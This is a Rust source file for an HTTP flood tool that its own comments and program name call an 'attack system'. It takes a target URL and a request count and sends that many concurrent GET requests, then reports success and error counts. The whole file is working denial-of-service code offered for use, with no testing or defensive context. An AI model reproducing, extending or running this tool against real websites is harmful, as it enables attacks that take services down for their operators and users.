// written by rahmed
// used rust
// dspcas flood

use clap::{Arg, Command};
use reqwest::Client;
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use tokio::time::sleep;

async fn check_internet() {
    let url = "https://google.com";
    loop {
        let client = Client::new();
        if let Ok(_) = client.head(url).send().await {
            break;
        }
        sleep(Duration::from_secs(5)).await;
    }
}

async fn check_url_exists(url: &str) -> bool {
    let client = Client::new();
    match client.head(url).send().await {
        Ok(response) => response.status().is_success(),
        Err(_) => false,
    }
}

fn ensure_https(url: &str) -> String {
    if url.starts_with("https://") {
        url.to_string()
    } else {
        let mut modified_url = url.to_string();
        if url.starts_with("http://") {
            modified_url.replace_range(0..5, "https://");
        } else {
            modified_url = format!("https://{}", url);
        }
        modified_url
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let matches = Command::new("Distrubuted System Process Controlled Attack System")
        .version("1.0")
        .author("Rahmed <rahmedyev@gmail.com>")
        .about("A tool for sending HTTP requests")
        .arg(
            Arg::new("url")
                .short('u')
                .long("url")
                .value_name("URL")
                .help("target url")
                .value_parser(clap::value_parser!(String))
                .required(true),
        )
        .arg(
            Arg::new("times")
                .short('t')
                .long("times")
                .value_name("TIMES")
                .help("how much request be sent")
                .value_parser(clap::value_parser!(u64))
                .required(true),
        )
        .try_get_matches();

    let matches = match matches {
        Ok(m) => m,
        Err(err) => {
            eprintln!("{}", err);
            return Ok(());
        }
    };

    let url = matches.get_one::<String>("url").unwrap();
    let times: u64 = *matches.get_one::<u64>("times").unwrap_or(&10);

    check_internet().await;

    let client = Client::builder().timeout(Duration::from_secs(5)).build()?;

    let modified_url = ensure_https(&url);

    if !check_url_exists(&modified_url).await {
        eprintln!("URL is not accessible via HTTPS, trying HTTP...");
        let http_url = modified_url.replace("https://", "http://");
        if !check_url_exists(&http_url).await {
            eprintln!("URL is not accessible via HTTP either, exiting.");
            return Ok(());
        } else {
            println!("Successfully connected using HTTP.");
        }
    } else {
        println!("Successfully connected using HTTPS.");
    }

    let success_count = Arc::new(Mutex::new(0));
    let error_count = Arc::new(Mutex::new(0));
    let total_bytes = Arc::new(Mutex::new(0));

    let start_time = Instant::now();

    let tasks: Vec<_> = (0..times)
        .map(|_| {
            let client = client.clone();
            let url = modified_url.clone();
            let success_count = Arc::clone(&success_count);
            let error_count = Arc::clone(&error_count);
            let total_bytes = Arc::clone(&total_bytes);

            tokio::spawn(async move {
                sleep(Duration::from_millis(1)).await;

                match client.get(&url).send().await {
                    Ok(response) => {
                        if response.status().is_success() {
                            *success_count.lock().unwrap() += 1;
                            if let Some(bytes) = response.content_length() {
                                *total_bytes.lock().unwrap() += bytes;
                            }
                        } else {
                            *error_count.lock().unwrap() += 1;
                        }
                    }
                    Err(_) => {
                        *error_count.lock().unwrap() += 1;
                    }
                }
            })
        })
        .collect();

    futures::future::join_all(tasks).await;

    let success = *success_count.lock().unwrap();
    let error = *error_count.lock().unwrap();
    let total = success + error;
    let total_bytes = *total_bytes.lock().unwrap();
    let elapsed = start_time.elapsed();

    println!(
        "Completed. Success: {}, Errors: {}, Total Bytes: {}, Time: {:?}",
        success, error, total_bytes, elapsed
    );

    Ok(())
}
